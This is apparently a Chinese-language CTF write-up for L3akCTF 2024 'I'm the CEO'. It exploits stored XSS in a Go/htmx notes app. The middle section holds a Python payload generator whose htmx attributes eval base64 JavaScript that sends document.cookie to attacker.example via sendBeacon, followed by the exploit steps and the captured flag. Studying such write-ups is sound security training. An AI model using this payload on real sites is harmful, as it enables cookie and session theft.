# L3akCTF 2024 I'm the CEO Writeup

## 题目简述

这是一个 Go 与 htmx 实现的笔记应用。Bot 访问用户提交的站内 URL 前，会设置一个可由 JavaScript 读取的 `flag` Cookie。笔记内容被声明为 `template.HTML`，Go 模板不会转义；独立查看页又没有加载主页上的 DOMPurify 清洗逻辑，因此可以通过 htmx 属性构造存储型 XSS。

## 解题过程

### 确认未转义的数据流

笔记结构直接把内容标成可信 HTML：

```go
type Note struct {
    ID      uuid.UUID
    Content template.HTML
    Owner   int
}
```

模板随后原样输出：

```html
{{range .}}
<div class="note">
    <p>{{.Content}}</p>
</div>
{{end}}
```

`/view/{uuid}` 页面通过 htmx 请求 `/api/note/{uuid}`，但该页面只加载 htmx，没有加载定义 `htmx:beforeSwap` 清洗器的 `/static/main.js`。`GetNoteByUUID` 也不检查笔记所有者或登录状态，所以 Admin Bot 能直接打开攻击者的查看链接。

### 使用 htmx 属性执行脚本

传统 `<script>` 标签并非必需。htmx 会解析新插入元素上的 `data-hx-*` 属性，可以让元素定时请求 `/`，并在请求完成事件中执行 JavaScript：

```python
import base64

javascript = (
    'navigator.sendBeacon('
    '"https://attacker.example/collect",'
    'document.cookie'
    ')'
)

encoded = base64.b64encode(
    javascript.encode()
).decode()

payload = (
    '<div '
    'data-hx-get="/" '
    'data-hx-trigger="every 5s" '
    'data-hx-on::after-request='
    f'"eval(atob(\'{encoded}\'))">'
    '</div>'
)

assert len(payload) <= 256
print(payload)
```

这里的 `attacker.example` 应替换为比赛授权范围内、能够记录请求体的接收端。`navigator.sendBeacon` 会把 `document.cookie` 作为请求体发送过去。

完整利用流程为：

1. 注册并登录自己的账户。
2. 把生成的 payload 作为笔记 `content` 提交。
3. 从响应的 `HX-Redirect` 取得 `/view/<uuid>`。
4. 将该站内完整 URL 提交给 Admin Bot。
5. Bot 设置非 HttpOnly 的 `flag` Cookie 后访问笔记；htmx 插入恶意节点并触发回连。

Bot 配置明确使用：

```javascript
await page.setCookie({
    name: "flag",
    httpOnly: false,
    value: CONFIG.APPFLAG,
    domain: CONFIG.APPHOST
});
```

接收端获得的 Cookie 中包含：

```text
L3AK{I_should_have_read_https://htmx.org/essays/htmx-sucks/}
```

## 方法总结

- `template.HTML` 会关闭 Go 模板的自动转义，只应承载服务端已经严格清洗的可信内容，不能直接存放用户输入。
- htmx 的事件属性本身就是脚本执行入口；XSS 审计不能只搜索 `<script>`、`onerror` 等传统载荷。
- 主页存在清洗器不代表所有渲染路径都受保护。本题独立查看页没有加载清洗脚本，是实际利用入口。
- Admin Bot 的 flag Cookie既非 HttpOnly，又能访问任意用户笔记；存储型 XSS 与越权读取笔记共同完成了泄露链。
